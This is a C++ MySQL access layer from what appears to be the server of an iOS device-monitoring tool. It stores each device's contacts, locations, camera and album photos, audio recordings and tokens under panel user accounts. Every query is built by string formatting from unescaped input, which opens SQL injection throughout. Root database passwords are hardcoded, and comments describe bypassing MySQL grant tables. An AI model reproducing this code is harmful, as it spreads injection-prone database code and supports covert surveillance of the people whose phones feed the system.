#include "iosmysqlOper.h"
#include "PublicFunction.h"

#include <string>

using namespace std;

#define DEFAULT_MYSQL_CHAR_SET "utf8mb4"
#define DATABASE_NAME "ios"
#define HOSTNAME "localhost"
#define MYSQL_PORT 3306
#ifdef _DEBUG 
#define USERNAME "root"
#define PASSWORD "123456"
#else
#define USERNAME "root"
#define PASSWORD "root"
#endif

string getformatdt() {
	SYSTEMTIME sttime = { 0 };
	GetLocalTime(&sttime);
	char sztime[1024] = { 0 };
	wsprintfA(sztime, "%u-%u-%u %u:%u:%u", sttime.wYear, sttime.wMonth, sttime.wDay, sttime.wHour, sttime.wMinute, sttime.wSecond);
	return string(sztime);
}


void replacestr(string & str) {
	int len = str.length();
	for (int i = 0; i < len; i++)
	{
		if (str.at(i) == '\\')
		{
			str.at(i) = '/';
		}
	}
}

MySql::MySql() :errorNum(0), errorInfo("ok")
{
	char szout[1024];
	bool ret = false;

	//mysql_library_init(0, NULL, NULL);
	mysql_init(&mysqlInstance);
	mysql_options(&mysqlInstance, MYSQL_SET_CHARSET_NAME, DEFAULT_MYSQL_CHAR_SET);

	ret = connectMySQL(HOSTNAME, USERNAME, PASSWORD, DATABASE_NAME, MYSQL_PORT);
	if (ret == false)
	{
		errorIntoMySQL();
		wsprintfA(szout, "mysql connect error:%u,info:%s", errorNum, errorInfo);
		return;
	}

	ret = useDatabase(DATABASE_NAME);
	if (ret == false)
	{
		errorIntoMySQL();
		wsprintfA(szout, "mysql use error:%u,info:%s", errorNum, errorInfo);
		return;
	}

	/*
	ret = init();
	
	createdbTable("CREATE TABLE audio "
		"(id int(11) NOT NULL AUTO_INCREMENT,"
		"client_id int(11) DEFAULT NULL,"
		"size varchar(255) DEFAULT NULL,"
		"path varchar(255) DEFAULT NULL,"
		"time varchar(255) DEFAULT NULL,"
		"PRIMARY KEY(id)) ENGINE = MyISAM  DEFAULT CHARSET = utf8;");

	createdbTable("CREATE TABLE clients "
		"(id int(11) NOT NULL AUTO_INCREMENT,"
		"userid int(11) DEFAULT NULL COMMENT \'用户id\',"
		"unique_id varchar(255) DEFAULT NULL COMMENT \'唯一标识\',"
		"name varchar(255) DEFAULT NULL COMMENT \'自定义名称\',"
		"infos text COMMENT \'存储deviceinfojson\',"
		"ts varchar(255) DEFAULT NULL,"
		"state int(10) DEFAULT '0' COMMENT \'0不在线1在线\',"
		"PRIMARY KEY(id)) ENGINE = MyISAM  DEFAULT CHARSET = utf8; ");

	createdbTable("CREATE TABLE contacts (id int(11) NOT NULL AUTO_INCREMENT,"
		"client_id int(11) DEFAULT NULL,"
		"name varchar(255) DEFAULT NULL,"
		"phone varchar(255) DEFAULT NULL,"
		"PRIMARY KEY(id)) ENGINE = MyISAM  DEFAULT CHARSET = utf8; ");

	createdbTable("CREATE TABLE location (id int(11) NOT NULL AUTO_INCREMENT,"
		"client_id int(11) DEFAULT NULL,"
		"info varchar(255) DEFAULT NULL,"
		"latitude varchar(255) DEFAULT NULL,"
		"longitude varchar(255) DEFAULT NULL,"
		"time varchar(255) DEFAULT NULL,"
		"PRIMARY KEY(id)) ENGINE = MyISAM  DEFAULT CHARSET = utf8; ");

	createdbTable("CREATE TABLE photo (id int(11) NOT NULL AUTO_INCREMENT,"
		"client_id int(11) DEFAULT NULL,"
		"type int(11) DEFAULT NULL COMMENT \'1相册2摄像头\',"
		"path varchar(255) DEFAULT NULL COMMENT \'图片的路径\',"
		"time varchar(255) DEFAULT NULL,"
		"PRIMARY KEY(id)) ENGINE = MyISAM  DEFAULT CHARSET = utf8; ");

	createdbTable("CREATE TABLE user (id int(11) NOT NULL AUTO_INCREMENT,"
		"user varchar(255) DEFAULT NULL,"
		"password varchar(255) DEFAULT NULL,"
		"state int(2) DEFAULT \'1\' COMMENT \'0停用1正常\',"
		"PRIMARY KEY(id)) ENGINE = MyISAM  DEFAULT CHARSET = utf8; ");


	createdbTable("CREATE TABLE logs (id int(11) NOT NULL AUTO_INCREMENT,"
		"userid int(11) DEFAULT NULL,"
		"info varchar(255) DEFAULT NULL,"
		"time varchar(255) DEFAULT NULL,"
		"ip varchar(255) DEFAULT NULL,"
		"PRIMARY KEY(id)) ENGINE = MyISAM  DEFAULT CHARSET = utf8; ");

	createdbTable("CREATE TABLE client_token (id int(11) NOT NULL AUTO_INCREMENT,"
		"client_id varchar(255) DEFAULT NULL,"
		"token varchar(255) DEFAULT NULL,"
		"PRIMARY KEY(id)) ENGINE = MyISAM  DEFAULT CHARSET = utf8; ");

	if (errorNum != 1050 && errorNum != 0)
	{
		wsprintfA(szout, "mysql init error:%u,info:%s", errorNum, errorInfo);
		MessageBoxA(0, szout, szout, MB_OK);
		ExitProcess(0);
	}
	*/

	return;
}


string MySql::getidFromToken(string clientid, string token) {
	char szcmd[1024];

	int len = wsprintfA(szcmd, "select id from client_token where client_id=%s",  clientid.c_str());
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if (data.at(0).size() <= 0) {
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		char szout[1024];
		wsprintfA(szout, "getidFromToken error:%s\r\n", token.c_str());
		WriteLogFile(szout);

		return "";
	}
}




int MySql::insertToken(string clientid,string token) {
	if (token == "")
	{
		WriteLogFile("token null\r\n");
		return false;
	}

	char cmd[1024];
	char szout[1024];

	string id = getidFromToken(clientid, token);
	if (id == "")
	{
		int len = wsprintfA(cmd, "INSERT INTO client_token (client_id,token) VALUES (%s,'%s')",clientid.c_str(), token.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}
	else {
		//wsprintfA(szout, "replace token:%s with:%s\r\n", token.c_str(), token.c_str());
		int len = wsprintfA(cmd, "UPDATE client_token SET id = %s,client_id = %s,token ='%s' WHERE id=%s", 
			id.c_str(),clientid.c_str(), token.c_str(),id.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}

	wsprintfA(szout,"insert token error,cleintid:%s,token:%s\r\n",clientid.c_str(),token.c_str());
	WriteLogFile(szout);

	errorIntoMySQL();
	return false;
}


string MySql::getidFromAudio(string clientid, string filepath) {
	char szcmd[1024];

	int len = wsprintfA(szcmd, "select id from audio where client_id=%s and path='%s'", clientid.c_str(),filepath.c_str());
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if (data.at(0).size() <= 0) {
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		char szout[1024];
		wsprintfA(szout, "getidFromAudio error,filepath:%s,clientid:%s\r\n", filepath.c_str(),clientid.c_str());
		WriteLogFile(szout);

		return "";
	}
}

int MySql::insertAudio(string clientid,string filepath,int filesize) {

	char szout[1024];
	char cmd[1024];
	string strtm = getformatdt();
	replacestr(filepath);

	string id = getidFromAudio(clientid, filepath);
	if (id == "")
	{
		int len = wsprintfA(cmd, "INSERT INTO audio(client_id,size,path,time) VALUES (%s, '%u', '%s', '%s')",
			clientid.c_str(), filesize, filepath.c_str(), strtm.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}
	else {
		int len = wsprintfA(cmd, "update audio set client_id=%s,size=%u,path='%s',time='%s' where id=%s",
			clientid.c_str(), filesize, filepath.c_str(), strtm.c_str(),id.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}

	wsprintfA(szout,"insert audio error,filename:%s\r\n",filepath.c_str());
	WriteLogFile(szout);

	errorIntoMySQL();
	return false;
}


int MySql::insertClientByCmd( string username, string iosid) {
	char cmd[1024];
	char szout[1024];

	string userid = getIdFromUserName(username);
	if (userid == "")
	{
		return false;
	}

	string strtm = getformatdt();

	string id = getIdFromClient(iosid);
	if (id == "")
	{
		int len = sprintf(cmd, "INSERT INTO clients (userid,unique_id,ts,state) VALUES (%s,'%s','%s',1)",
			userid.c_str(), iosid.c_str(), strtm.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}
	else {
		int len = sprintf(cmd, "UPDATE clients SET unique_id = '%s',ts='%s',state=1 WHERE id='%s'",
			iosid.c_str(), strtm.c_str(),id.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}

	wsprintfA(szout,"insertClientByCmd error,username:%s,imei:%s\r\n",username.c_str(),iosid.c_str());
	WriteLogFile(szout);

	errorIntoMySQL();
	return false;
}

int MySql::insertClient(string clientid,string username,string iosid, string info,string token) {
	char cmd[0x4000];
	char szout[1024];

	string userid = getIdFromUserName(username);
	if (userid == "")
	{
		return false;
	}

	string strtm = getformatdt();

	if (clientid == "")
	{
		int len = sprintf(cmd, "INSERT INTO clients (userid,unique_id,infos,ts,state) VALUES (%s,'%s','%s','%s', 1)",
		userid.c_str(),iosid.c_str(),info.c_str(),strtm.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {

			clientid = getIdFromClient(iosid);
			if (clientid != "" && token != "")
			{
				int ret = insertToken(clientid, token);
				return ret;
			}
			else {
				wsprintfA(szout, "user:%s imei:%s token or clientid null\r\n", username.c_str(), iosid.c_str());
				WriteLogFile(szout);
				return true;
			}
		}
	}
	else {
		int len = sprintf(cmd, "UPDATE clients SET unique_id = '%s',infos='%s',ts = '%s',state = 1 WHERE id=%s",
			iosid.c_str(),info.c_str(), strtm.c_str(), clientid.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			if (token != "")
			{
				int ret = insertToken(clientid, token);
				return ret;
			}
			else {
				wsprintfA(szout, "user:%s imei:%s token null\r\n", username.c_str(), iosid.c_str());
				WriteLogFile(szout);
				return true;
			}
		}
	}

	wsprintfA(szout, "insertClient error,imei:%s,user:%s\r\n",iosid.c_str(),username.c_str());
	WriteLogFile(szout);
	errorIntoMySQL();
	return false;
}


string MySql::getidFromContacts(string clientid,string username,string phone) {
	char szcmd[1024];

	int len = wsprintfA(szcmd, "select id from contacts where name='%s' and client_id = %s", username.c_str(), clientid.c_str());
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if (data.at(0).size() <= 0) {
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		char szout[1024];
		wsprintfA(szout, "getidFromContacts error:%s\r\n", username.c_str());
		WriteLogFile(szout);

		return "";
	}
}

int MySql::insertContacts(string clientid, string username, string phone) {
	
	char szout[1024];
	char cmd[1024];
	string strtm = getformatdt();

	string id = getidFromContacts(clientid, username, phone);
	if (id == "")
	{
		int len = wsprintfA(cmd, "INSERT INTO contacts (client_id,name,phone) VALUES ( %s, '%s', '%s')",
			clientid.c_str(), username.c_str(), phone.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}
	else {
		//replace语句不能根据where子句来定位要被替换的记录
		int len = wsprintfA(cmd, "UPDATE contacts SET id =%s ,client_id = %s,name = '%s',phone='%s' WHERE id = %s",
			id.c_str(),clientid.c_str(), username.c_str(), phone.c_str(),id.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}

	wsprintfA(szout,"insertContacts error,id:%s,name:%s,phone:%s\r\n",clientid.c_str(),username.c_str(),phone.c_str());
	WriteLogFile(szout);

	errorIntoMySQL();
	return false;
}


string MySql::getidFromLocation(string clientid, string timestamp) {
	char szcmd[1024];

	int len = wsprintfA(szcmd, "select id from location where time='%s' and client_id = %s", timestamp.c_str(), clientid.c_str());
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if (data.at(0).size() <= 0) {
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		char szout[1024];
		wsprintfA(szout, "getidFromLocation error,clientid:%s\r\n", clientid.c_str());
		WriteLogFile(szout);

		return "";
	}
}

int MySql::insertLocation(string clientid, string locdesc, string x,string y,string timestr) {
	
	char szout[1024];
	char cmd[0x1000];

	string id = getidFromLocation(clientid, timestr);
	if (id == "")
	{
		int len = sprintf(cmd, "INSERT INTO location (client_id,info,latitude,longitude,time) VALUES ( %s, '%s', '%s', '%s', '%s')",
			clientid.c_str(), locdesc.c_str(), x.c_str(), y.c_str(), timestr.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}
	else {
		int len = sprintf(cmd, "UPDATE location set client_id = %s,info='%s',latitude = '%s',longitude='%s',time='%s' WHERE id = %s",
			clientid.c_str(), locdesc.c_str(), x.c_str(), y.c_str(), timestr.c_str(), id.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}

	wsprintfA(szout,"insert location error,id:%s\r\n",clientid.c_str());
	WriteLogFile(szout);
	errorIntoMySQL();
	return false;
}

string MySql::getidFromPhoto(string clientid, string filename) {
	char szcmd[1024];

	int len = wsprintfA(szcmd, "select id from photo where path='%s' and client_id = %s", filename.c_str(), clientid.c_str());
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if (data.at(0).size() <= 0) {
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		char szout[1024];
		wsprintfA(szout, "getidFromPhoto error,filename:%s,clientid\r\n", filename.c_str(),clientid.c_str());
		WriteLogFile(szout);

		return "";
	}
}

int MySql::insertPhoto(string clientid, string type, string filepath) {
	if (clientid == "")
	{
		return false;
	}
	char cmd[1024];
	char szout[1024];
	string strtm = getformatdt();
	replacestr(filepath);

	string id = getidFromPhoto(clientid, filepath);
	if (id == "")
	{
		int len = wsprintfA(cmd, "INSERT INTO photo (client_id,type,path,time) VALUES (%s, %s, '%s', '%s')",
			clientid.c_str(), type.c_str(), filepath.c_str(), strtm.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}
	else {
		int len = sprintf(cmd, "UPDATE photo set client_id = %s,type='%s',path = '%s',time='%s' WHERE id = %s",
			clientid.c_str(), type.c_str(), filepath.c_str(),strtm.c_str(), id.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}

	wsprintfA(szout,"insert photo error,filename:%s\r\n",filepath.c_str());
	WriteLogFile(szout);
	errorIntoMySQL();
	return false;
}


string MySql::getIdFromUserName(string username) {
	char szcmd[1024];
	wsprintfA(szcmd, "select id from user where user=\'%s\'", username.c_str());
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if (data.at(0).size() <= 0) {
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		char szout[1024];
		wsprintfA(szout, "getIdFromUserName error:%s\r\n", username.c_str());
		WriteLogFile(szout);

		return "";
	}
}

string MySql::getIdFromClient(string iosid) {
	char szcmd[1024];
	wsprintfA(szcmd, "select id from clients where unique_id=\'%s\'", iosid.c_str());
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if(data.at(0).size() <= 0){
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		char szout[1024];
		wsprintfA(szout, "getIdFromClient error:%s\r\n", iosid.c_str());
		WriteLogFile(szout);

		return "";
	}
}


bool MySql::init() {
	int value = 1;
	mysql_options(&mysqlInstance, MYSQL_OPT_RECONNECT, (char *)&value);

	string cmd = "set global max_allowed_packet=1024*1024*1024;";
	if (mysql_query(&mysqlInstance, cmd.c_str())) {
		return false;
	}

	cmd = "set interactive_timeout=30*24*3600";
	if (mysql_query(&mysqlInstance, cmd.c_str())) {
		return false;
	}

	cmd = "set global wait_timeout=30*24*3600; ";
	if (mysql_query(&mysqlInstance, cmd.c_str())) {
		return false;
	}

	return true;
}


bool MySql::connectMySQL(char* server, char* username, char* password, char* database, int port)
{
	if (mysql_real_connect(&mysqlInstance, server, username, password, database, port, 0, 0) != NULL) {
		return true;
	}
	else {
		errorIntoMySQL();
	}
		
	return false;
}

bool MySql::useDatabase(std::string dbname)
{
	string queryStr = "use ";
	queryStr += dbname;
	if (0 == mysql_query(&mysqlInstance, queryStr.c_str()))
	{
		return true;
	}
	else {
		WriteLogFile("use database error\r\n");
		errorIntoMySQL();
		return false;
	}
}


bool MySql::createDatabase(std::string dbname)
{
	std::string queryStr = "create database if not exists ";
	queryStr += dbname + ";";
	if (0 == mysql_query(&mysqlInstance, queryStr.c_str()))
	{
		queryStr = "use ";
		queryStr += dbname;
		if (0 == mysql_query(&mysqlInstance, queryStr.c_str()))
		{
			return true;
		}

	}
	errorIntoMySQL();
	return false;
}



bool MySql::createdbTable(const std::string& query)
{
	if (0 == mysql_query(&mysqlInstance, query.c_str()))
	{
		return true;
	}
	errorIntoMySQL();
	return false;
}


bool MySql::getDatafromDB(string queryStr, std::vector<std::vector<std::string> >& data)
{
	if (0 != mysql_query(&mysqlInstance, queryStr.c_str()))
	{
		errorIntoMySQL();
		return false;
	}

	result = mysql_store_result(&mysqlInstance);
	if (result <= 0)
	{
		errorIntoMySQL();
		return false;
	}

	unsigned long long row = mysql_num_rows(result);
	int field = mysql_num_fields(result);

	MYSQL_ROW line = NULL;
	line = mysql_fetch_row(result);

	int j = 0;
	std::string temp = "";
	while (NULL != line)
	{
		std::vector<std::string> linedata;
		for (int i = 0; i < field; i++)
		{
			if (line[i])
			{
				temp = line[i];
				linedata.push_back(temp);
			}
			else
			{
				temp = "";
				linedata.push_back(temp);
			}
		}
		line = mysql_fetch_row(result);
		data.push_back(linedata);
	}
	mysql_free_result(result);
	return true;
}

void MySql::recorderr() {
	char szout[1024];
	wsprintfA(szout, "mysql error no:%u,error info:%s\r\n", errorNum, errorInfo);
	WriteLogFile(szout);
}

void MySql::errorIntoMySQL()
{
	errorNum = mysql_errno(&mysqlInstance);
	errorInfo = mysql_error(&mysqlInstance);
}

void MySql::closeMySQL()
{
	mysql_close(&mysqlInstance);
}

MySql::~MySql()
{
	mysql_library_end();

	closeMySQL();
}

CRITICAL_SECTION mycritical = { 0 };

void MySql::initLock() {
	InitializeCriticalSection(&mycritical);
}
void MySql::enter() {
	EnterCriticalSection(&mycritical);
}
void MySql::leave() {
	LeaveCriticalSection(&mycritical);
}


//setup mysql
//mysqld --install
//mysqld --initialize --user=root --console
//net start mysql

//net stop mysql
//skip-grant-tables
//net start mysql
//mysql
// use mysql;
//update user set password=password("520") where user="root";
//flush privileges;


/*

Navicat MySQL Data Transfer

Source Server         : 127.0.0.1
Source Server Version : 50505
Source Host           : localhost:3306
Source Database       : ios

Target Server Type    : MYSQL
Target Server Version : 50505
File Encoding         : 65001

Date: 2019-05-23 16:56:42


SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
--Table structure for audio
-- ----------------------------
DROP TABLE IF EXISTS audio;
CREATE TABLE audio(
	id int(11) NOT NULL AUTO_INCREMENT,
	client_id int(11) DEFAULT NULL,
	size varchar(255) DEFAULT NULL,
	path varchar(255) DEFAULT NULL,
	time varchar(255) DEFAULT NULL,
	PRIMARY KEY(id)
) ENGINE = MyISAM DEFAULT CHARSET = utf8;

-- ----------------------------
--Table structure for clients
-- ----------------------------
DROP TABLE IF EXISTS clients;
CREATE TABLE clients(
	id int(11) NOT NULL AUTO_INCREMENT,
	userid int(11) DEFAULT NULL COMMENT '用户id',
	unique_id varchar(255) DEFAULT NULL COMMENT '唯一标识',
	name varchar(255) DEFAULT NULL COMMENT '自定义名称',
	infos text COMMENT '存储deviceinfojson',
	ts varchar(255) DEFAULT NULL,
	state int(10) DEFAULT '0' COMMENT '0不在线1在线',
	group_id int(11) DEFAULT '0' COMMENT '分组id',
	PRIMARY KEY(id)
) ENGINE = MyISAM DEFAULT CHARSET = utf8;

-- ----------------------------
--Table structure for client_token
-- ----------------------------
DROP TABLE IF EXISTS client_token;
CREATE TABLE client_token(
	id int(11) NOT NULL AUTO_INCREMENT,
	client_id int(11) DEFAULT NULL,
	token varchar(255) DEFAULT NULL,
	PRIMARY KEY(id)
) ENGINE = MyISAM DEFAULT CHARSET = utf8;

-- ----------------------------
--Table structure for contacts
-- ----------------------------
DROP TABLE IF EXISTS contacts;
CREATE TABLE contacts(
	id int(11) NOT NULL AUTO_INCREMENT,
	client_id int(11) DEFAULT NULL,
	name varchar(255) DEFAULT NULL,
	phone varchar(255) DEFAULT NULL,
	PRIMARY KEY(id)
) ENGINE = MyISAM DEFAULT CHARSET = utf8;

-- ----------------------------
--Table structure for grouplist
-- ----------------------------
DROP TABLE IF EXISTS grouplist;
CREATE TABLE grouplist(
	id int(11) NOT NULL AUTO_INCREMENT,
	group_name varchar(255) DEFAULT NULL,
	userid int(11) DEFAULT NULL,
	PRIMARY KEY(id)
) ENGINE = MyISAM DEFAULT CHARSET = utf8;

-- ----------------------------
--Table structure for location
-- ----------------------------
DROP TABLE IF EXISTS location;
CREATE TABLE location(
	id int(11) NOT NULL AUTO_INCREMENT,
	client_id int(11) DEFAULT NULL,
	info varchar(255) DEFAULT NULL,
	latitude varchar(255) DEFAULT NULL,
	longitude varchar(255) DEFAULT NULL,
	time varchar(255) DEFAULT NULL,
	PRIMARY KEY(id)
) ENGINE = MyISAM DEFAULT CHARSET = utf8;

-- ----------------------------
--Table structure for logs
-- ----------------------------
DROP TABLE IF EXISTS logs;
CREATE TABLE logs(
	id int(11) NOT NULL AUTO_INCREMENT,
	userid int(11) DEFAULT NULL,
	info varchar(255) DEFAULT NULL,
	time varchar(255) DEFAULT NULL,
	ip varchar(255) DEFAULT NULL,
	PRIMARY KEY(id)
) ENGINE = MyISAM DEFAULT CHARSET = utf8;

-- ----------------------------
--Table structure for photo
-- ----------------------------
DROP TABLE IF EXISTS photo;
CREATE TABLE photo(
	id int(11) NOT NULL AUTO_INCREMENT,
	client_id int(11) DEFAULT NULL,
	type int(11) DEFAULT NULL COMMENT '1相册2摄像头',
	path varchar(255) DEFAULT NULL COMMENT '图片的路径',
	time varchar(255) DEFAULT NULL,
	PRIMARY KEY(id)
) ENGINE = MyISAM DEFAULT CHARSET = utf8;

-- ----------------------------
--Table structure for user
-- ----------------------------
DROP TABLE IF EXISTS user;
CREATE TABLE user(
	id int(11) NOT NULL AUTO_INCREMENT,
	user varchar(255) DEFAULT NULL,
	password varchar(255) DEFAULT NULL,
	state int(2) DEFAULT '1' COMMENT '0停用1正常',
	PRIMARY KEY(id)
) ENGINE = MyISAM DEFAULT CHARSET = utf8;

*/